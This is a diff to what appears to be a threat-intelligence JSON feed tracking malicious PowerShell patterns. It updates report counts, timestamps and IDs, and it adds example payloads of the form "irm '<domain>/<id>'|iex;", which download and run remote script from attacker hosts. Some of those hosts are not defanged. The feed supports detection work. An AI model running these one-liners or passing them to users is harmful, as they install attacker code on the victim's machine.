@@ -184,10 +184,10 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 45,
-    "ReportCount": 45,
+    "DistinctPayloadCount": 46,
+    "ReportCount": 46,
     "FirstSeen": "2026-11-18T17:34:21.022000+00:00",
-    "LastSeen": "2026-11-25T02:32:07.384000+00:00",
+    "LastSeen": "2026-11-25T13:44:20.329000+00:00",
     "ReportIds": [
       "cmwmei4nv1tbg0omlbgmnensw",
       "cmwmps60l1tve0oml0q574odl",
@@ -233,7 +233,8 @@
       "cmwv2yx180cw80nml5hla7v62",
       "cmwv3brgd0d650nmlz6sqlmmc",
       "cmwv5lbd80dk00nmlcqi5wclc",
-      "cmwvictk00ep70nmlz5fj9rod"
+      "cmwvictk00ep70nmlz5fj9rod",
+      "cmww6dan60g7a0nml31wlxszd"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/336728d213008c22'|iex;",
@@ -241,6 +242,7 @@
       "irm 'browse-cloud.codes/7570b7171e7d3dd2'|iex;",
       "irm 'browse-cloud.codes/9a2a2d2a3afdee6f'|iex;",
       "irm 'browse-cloud.codes/e42bbacd936c1293'|iex;",
+      "irm 'browse-login[.]info/a0ab86b89832a232'|iex;",
       "irm 'img-codes-cloude[.]info/0253250b2b50c7ff'|iex;",
       "irm 'img-codes-cloude[.]info/0c422f1bf6150bfd'|iex;",
       "irm 'img-codes-cloude[.]info/10fb6db048d0ef86'|iex;",
@@ -380,11 +382,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 45,
-    "FirstSeen": "2026-11-18T13:54:31.270000+00:00",
+    "ReportCount": 44,
+    "FirstSeen": "2026-11-18T14:18:19.279000+00:00",
     "LastSeen": "2026-11-25T09:33:48.278000+00:00",
     "ReportIds": [
-      "cmwm6nfdo1scb0omllphe87cz",
       "cmwm7i18s1sda0omler9ihr8u",
       "cmwm8sw3e1sgr0omlknxj3rm2",
       "cmwmcr24e1slr0omlt0ye13yq",
